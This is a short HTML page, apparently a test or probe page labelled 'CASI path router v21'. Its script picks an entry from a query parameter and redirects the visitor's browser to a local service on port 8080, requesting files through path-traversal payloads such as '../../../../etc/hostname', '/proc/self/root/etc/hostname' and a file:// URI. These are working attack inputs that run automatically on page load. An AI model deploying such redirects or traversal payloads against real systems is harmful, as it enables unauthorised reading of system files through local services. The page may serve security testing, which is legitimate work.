<!doctype html><html><head><meta charset="utf-8"><title>CASI path router v21</title><script>
const t=[
['127.0.0.1','/etc/hostname'],
['127.0.0.1','etc/hostname'],
['127.0.0.1','../etc/hostname'],
['127.0.0.1','../../../../etc/hostname'],
['127.0.0.1','../../../../../../../../etc/hostname'],
['127.0.0.1','/proc/self/root/etc/hostname'],
['127.0.0.1','../../../../../../../../etc/hosts'],
['localhost','../../../../../../../../etc/hostname'],
['127.0.0.1','file:///etc/hostname']];
const q=new URLSearchParams(location.search),i=Math.abs(Number(q.get('veh_id')||0))%t.length,[h,n]=t[i];
document.title='CASI v21 '+i;setTimeout(()=>location.replace('http://'+h+':8080/file?name='+encodeURIComponent(n)),100);
</script></head><body>CASI v21 selected path</body></html>
